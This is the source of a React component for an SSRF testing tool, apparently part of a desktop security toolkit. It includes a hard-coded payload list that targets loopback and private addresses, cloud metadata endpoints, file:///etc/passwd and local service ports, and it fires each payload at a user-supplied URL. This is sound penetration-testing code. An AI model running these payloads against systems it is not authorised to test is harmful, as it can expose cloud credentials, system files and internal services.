import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { NetworkIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

export default function SSRFTester() {
  const [url, setUrl] = useState('');
  const [parameter, setParameter] = useState('url');
  const [results, setResults] = useState<{ payload: string; status: string; risk: string }[]>([]);
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState('');

  const payloads = [
    { payload: 'http://127.0.0.1', risk: 'Critical' },
    { payload: 'http://localhost', risk: 'Critical' },
    { payload: 'http://169.254.169.254/latest/meta-data/', risk: 'Critical' },
    { payload: 'http://metadata.google.internal/', risk: 'Critical' },
    { payload: 'http://192.168.1.1', risk: 'High' },
    { payload: 'http://10.0.0.1', risk: 'High' },
    { payload: 'http://172.16.0.1', risk: 'High' },
    { payload: 'file:///etc/passwd', risk: 'Critical' },
    { payload: 'http://localhost:22', risk: 'High' },
    { payload: 'http://localhost:3306', risk: 'High' },
  ];

  const test = async () => {
    if (!url.trim() || !parameter.trim()) {
      setError('Please enter URL and parameter name');
      return;
    }

    setLoading(true);
    setError('');
    setResults([]);
    setProgress(0);

    const testResults: { payload: string; status: string; risk: string }[] = [];

    for (let i = 0; i < payloads.length; i++) {
      const { payload, risk } = payloads[i];
      const separator = url.includes('?') ? '&' : '?';
      const testUrl = `${url}${separator}${parameter}=${encodeURIComponent(payload)}`;
      setProgress(Math.round(((i + 1) / payloads.length) * 100));

      try {
        const response = await window.electronAPI.net.httpFetch(testUrl, { method: 'GET' });

        if (response.success && response.data) {
          const hasMetadata =
            response.data.includes('ami-id') || response.data.includes('instance-id');
          const isLocalAccess =
            payload.includes('localhost') ||
            payload.includes('127.0.0.1') ||
            payload.includes('169.254');

          if (hasMetadata) {
            testResults.push({ payload, status: 'VULNERABLE - Cloud metadata accessible!', risk });
          } else if (isLocalAccess && response.status === 200) {
            testResults.push({ payload, status: 'VULNERABLE - Local resource accessed', risk });
          } else {
            testResults.push({ payload, status: `Status: ${response.status}`, risk });
          }
        } else {
          testResults.push({ payload, status: `Error: ${response.error || 'Failed'}`, risk });
        }
      } catch {
        testResults.push({ payload, status: 'Error', risk });
      }

      setResults([...testResults]);
      await new Promise((r) => setTimeout(r, 100));
    }

    setLoading(false);
  };

  return (
    <ToolWrapper
      title="SSRF Tester"
      icon={<NetworkIcon />}
      description="Test for Server-Side Request Forgery"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com/api/fetch"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="url"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={test} disabled={loading}>
            {loading ? `Testing... ${progress}%` : 'Test SSRF'}
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setUrl('');
              setParameter('');
              setResults([]);
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {loading && (
        <div className={styles.resultBox}>
          <div className={styles.progressBar}>
            <div className={styles.progressFill} style={{ width: `${progress}%` }} />
          </div>
        </div>
      )}

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Results</span>
          </div>
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Risk</th>
                <th>Payload</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {results.map((r, i) => (
                <tr key={i}>
                  <td>
                    <span
                      className={r.risk === 'Critical' ? styles.badgeError : styles.badgeWarning}
                    >
                      {r.risk}
                    </span>
                  </td>
                  <td className={styles.code}>{r.payload}</td>
                  <td>
                    <span className={r.status.includes('VULNERABLE') ? styles.badgeError : ''}>
                      {r.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <div className={styles.warningBox}>
        Only test on systems you own or have permission to test.
      </div>
    </ToolWrapper>
  );
}
